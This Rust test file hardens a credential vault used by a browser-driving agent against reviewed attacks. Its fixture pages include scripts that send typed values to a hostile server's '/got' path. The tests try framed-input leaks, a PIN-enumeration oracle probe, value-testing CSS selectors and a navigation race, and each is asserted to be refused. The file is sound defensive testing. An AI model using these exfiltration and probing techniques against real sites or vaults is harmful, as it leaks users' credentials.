//! Phase 3 hardening against real Chrome: the attacks of the independent security review
//! (C1–C3, I1–I5) must not get a value or a fragment of one. Runs only when
//! KEYHARBOR_TEST_CHROME is set.
#![cfg(unix)]

mod common;

use common::{chrome, harness::Harness, serve_fn};
use serde_json::json;

/// A login form whose password input a button switches between `password` and `text`.
fn login_page() -> String {
    "<!doctype html><title>Login</title><form action=/next method=get>\
     <label>User <input id=user name=user></label>\
     <label>Password <input id=pw name=pw type=password></label>\
     <button type=button id=show onclick=\"pw.type = pw.type == 'password' ? 'text' : 'password'\">Show</button>\
     <button id=go>Sign in</button></form>"
        .to_owned()
}

/// Every prefix and suffix of `value` at least `min` characters long, and `value` itself.
fn fragments(value: &str, min: usize) -> Vec<String> {
    let mut out = Vec::new();
    for n in min..=value.len() {
        out.push(value[..n].to_owned());
        out.push(value[value.len() - n..].to_owned());
    }
    out
}

#[test]
fn edited_values_stay_hidden_and_passwords_go_only_into_password_inputs() {
    let Some(browser) = chrome() else { return };
    let base = serve_fn(|_| login_page());
    let mut h = Harness::new();
    let (user, password) = (h.synth("user"), h.synth("password"));
    h.add(
        "site",
        "login",
        &[&base],
        json!({"username": user, "password": password}),
    );
    h.open(&browser);
    h.ok_call(json!({"op": "navigate", "url": format!("{base}/")}));

    // C1: the password does not go into a text input, where it would show in snapshots.
    assert_eq!(
        h.fill("#user", "{{secret:site.password}}")
            .unwrap_err()
            .to_string(),
        "denied: site (field-kind)"
    );
    h.ok_call(json!({"op": "click", "target": {"selector": "#user"}}));
    assert!(
        h.call(json!({"op": "type", "text": "{{secret:site.password}}"}))
            .is_err()
    );

    // Editing a substituted value no longer lets the masker miss it: the element stays
    // redacted for the whole session.
    h.fill("#user", "{{secret:site.username}}").unwrap();
    h.ok_call(json!({"op": "press", "key": "Backspace"}));
    let snapshot = h.snapshot();
    let line = snapshot
        .lines()
        .find(|l| l.contains("textbox \"User\""))
        .unwrap();
    assert!(line.ends_with("value=\"[redacted]\""), "{line}");

    // A password input switched to text by the page is still redacted, after any edit.
    h.fill("#pw", "{{secret:site.password}}").unwrap();
    h.ok_call(json!({"op": "press", "key": "Backspace"}));
    h.ok_call(json!({"op": "click", "target": {"selector": "#show"}}));
    let snapshot = h.snapshot();
    assert!(snapshot.contains("value=\"[redacted]\""), "{snapshot}");
    h.ok_call(json!({"op": "click", "target": {"selector": "#pw"}}));
    h.ok_call(json!({"op": "press", "key": "Home"}));
    h.ok_call(json!({"op": "press", "key": "Delete"}));
    h.snapshot();

    let mut secrets = fragments(&user, user.len() - 4);
    secrets.extend(fragments(&password, password.len() - 4));
    let refs: Vec<&str> = secrets.iter().map(String::as_str).collect();
    h.assert_absent(&refs);
}

/// The refs of snapshot lines whose role is one of `roles`.
fn refs_with_role(snapshot: &str, roles: &[&str]) -> Vec<u64> {
    snapshot
        .lines()
        .filter_map(|line| {
            let line = line.trim_start();
            let (reference, rest) = line.strip_prefix('[')?.split_once("] ")?;
            let role = rest.split(' ').next()?;
            roles.contains(&role).then(|| reference.parse().ok())?
        })
        .collect()
}

#[test]
fn frames_behind_shadow_roots_and_objects_do_not_count_as_the_page() {
    let Some(browser) = chrome() else { return };
    let got = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let log = got.clone();
    // B: an input that reports every value it receives back to its server.
    let inner = serve_fn(move |path| {
        log.lock().unwrap().push(path.to_owned());
        "<!doctype html><title>Inner</title><input id=x aria-label=Inner style='width:100%;height:80px'>\
         <script>x.addEventListener('input', () => { new Image().src = '/got?' + encodeURIComponent(x.value); });</script>"
            .to_owned()
    });
    // A: the item's origin, embedding B in an open shadow root and in an <object>.
    let inner_url = inner.clone();
    let outer = serve_fn(move |_| {
        format!(
            "<!doctype html><title>Outer</title><div id=host></div>\
             <object id=o data=\"{inner_url}/\" width=300 height=100></object>\
             <script>host.attachShadow({{mode: 'open'}}).innerHTML = '<iframe src=\"{inner_url}/\" width=300 height=100></iframe>';</script>"
        )
    });
    let mut h = Harness::new();
    let user = h.synth("user");
    h.add("site", "login", &[&outer], json!({"username": user}));
    h.open(&browser);
    h.ok_call(json!({"op": "navigate", "url": format!("{outer}/")}));
    h.ok_call(json!({"op": "wait", "ms": 1000}));
    let snapshot = h.snapshot();
    let hosts = refs_with_role(&snapshot, &["Iframe", "PluginObject", "embeddedobject"]);
    assert!(hosts.len() >= 2, "{snapshot}");
    let mut tried = 0;
    for reference in hosts {
        if h.call(json!({"op": "click", "target": {"ref": reference}}))
            .is_err()
        {
            continue;
        }
        tried += 1;
        let error = h.denied(json!({"op": "type", "text": "{{secret:site.username}}"}));
        assert!(error.starts_with("denied: site ("), "{error}");
    }
    assert!(tried >= 2, "{snapshot}");
    h.ok_call(json!({"op": "wait", "ms": 300}));
    assert!(
        !got.lock().unwrap().iter().any(|p| p.starts_with("/got")),
        "a framed document received the value"
    );
    h.assert_absent(&[&user]);
}

#[test]
fn the_masker_is_no_oracle_and_escaped_values_stay_masked() {
    let Some(browser) = chrome() else { return };
    let base = serve_fn(|_| login_page());
    let mut h = Harness::new();
    // I2: a value JSON would escape; I1: a short value the agent may not use.
    let quoted = format!("{}\"q\\z", h.synth("qq"));
    h.add("site", "login", &[&base], json!({"username": quoted}));
    h.add("bank", "secret", &[], json!({"value": "4821"}));
    h.ok(
        &[
            "policy",
            "deny",
            "--agent",
            "*",
            "--resource",
            "item",
            "--target",
            "bank",
        ],
        None,
    );
    h.open(&browser);
    h.ok_call(json!({"op": "navigate", "url": format!("{base}/")}));
    h.fill("#user", "{{secret:site.username}}").unwrap();
    h.ok_call(json!({"op": "click", "target": {"selector": "#go"}}));
    h.ok_call(json!({"op": "wait", "ms": 500}));
    h.snapshot();
    h.ok_call(json!({"op": "tabs"}));

    // A URL listing every candidate PIN is refused as a whole, never answered with a
    // placeholder at the right position; the third such request locks the session.
    let candidates: Vec<String> = (4000..5000).map(|n| format!("{n:04}")).collect();
    let url = format!("{base}/x?q={}", candidates.join("."));
    for _ in 0..3 {
        let error = h.denied(json!({"op": "navigate", "url": url}));
        assert!(
            error.starts_with("denied: the request contains a vault value"),
            "{error}"
        );
    }
    let error = h.denied(json!({"op": "navigate", "url": format!("{base}/")}));
    assert!(error.contains("accepts no more text"), "{error}");
    let audit = h.ok(&["audit", "--json"], None);
    assert_eq!(
        audit.matches("\"kind\":\"mask_probe\"").count(),
        3,
        "{audit}"
    );
    assert!(
        audit.contains("\"kind\":\"substitution_locked\""),
        "{audit}"
    );

    let transcript = h.transcript.borrow().clone();
    assert!(
        !transcript.contains("{{secret:bank.value}}"),
        "the masker answered"
    );
    let escaped = serde_json::to_string(&quoted).unwrap();
    assert!(
        !transcript.contains(&escaped[1..escaped.len() - 1]),
        "{transcript}"
    );
    h.assert_absent(&[&quoted]);
}

#[test]
fn selectors_cannot_test_what_a_field_holds() {
    let Some(browser) = chrome() else { return };
    // A page that copies what is typed into the value attribute, which `[value^=…]` reads.
    let base = serve_fn(|_| {
        "<!doctype html><title>Login</title><input id=user aria-label=User placeholder=name \
         oninput=\"this.setAttribute('value', this.value)\"><button id=go>Go</button>"
            .to_owned()
    });
    let mut h = Harness::new();
    let user = h.synth("user");
    h.add("site", "login", &[&base], json!({"username": user}));
    h.open(&browser);
    h.ok_call(json!({"op": "navigate", "url": format!("{base}/")}));
    h.fill("#user", "{{secret:site.username}}").unwrap();
    for selector in [
        "input[value^=\"KH-SYNTH\"]",
        "#user:placeholder-shown",
        "body:has(#user[value^=K])",
        "#user:valid",
        "input\\5b value^=K]",
    ] {
        for request in [
            json!({"op": "wait", "selector": selector}),
            json!({"op": "click", "target": {"selector": selector}}),
            json!({"op": "fill", "target": {"selector": selector}, "text": "x"}),
        ] {
            let error = h.denied(request);
            assert!(
                error.starts_with("selector not allowed"),
                "{selector}: {error}"
            );
        }
    }
    h.ok_call(json!({"op": "click", "target": {"selector": "button#go"}}));
    h.assert_absent(&[&user]);
}

#[test]
fn a_navigation_the_agent_starts_stops_substitution_until_it_is_over() {
    let Some(browser) = chrome() else { return };
    let got = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let log = got.clone();
    // B answers /slow after five seconds with an autofocused input that reports its value.
    let evil = serve_fn(move |path| {
        log.lock().unwrap().push(path.to_owned());
        "<!doctype html><title>Evil</title><input id=x autofocus aria-label=X>\
         <script>x.addEventListener('input', () => { new Image().src = '/got?' + encodeURIComponent(x.value); });</script>"
            .to_owned()
    });
    let target = format!("{evil}/slow");
    let base = serve_fn(move |_| {
        format!(
            "<!doctype html><title>Site</title><input id=user aria-label=User><a id=away href=\"{target}\">away</a>"
        )
    });
    let mut h = Harness::new();
    let user = h.synth("user");
    h.add("site", "login", &[&base], json!({"username": user}));
    h.open(&browser);
    h.ok_call(json!({"op": "navigate", "url": format!("{base}/")}));
    h.ok_call(json!({"op": "click", "target": {"selector": "#away"}}));
    // The old document is still shown while B loads; nothing is typed until it is done.
    let error = h.denied(
        json!({"op": "fill", "target": {"selector": "#user"}, "text": "{{secret:site.username}}"}),
    );
    assert_eq!(error, "denied: site (navigating)");
    h.ok_call(json!({"op": "wait", "selector": "#x"}));
    let error = h.denied(json!({"op": "type", "text": "{{secret:site.username}}"}));
    assert_eq!(error, "denied: site (origin)");
    h.ok_call(json!({"op": "wait", "ms": 300}));
    assert!(!got.lock().unwrap().iter().any(|p| p.starts_with("/got")));
    h.assert_absent(&[&user]);
}
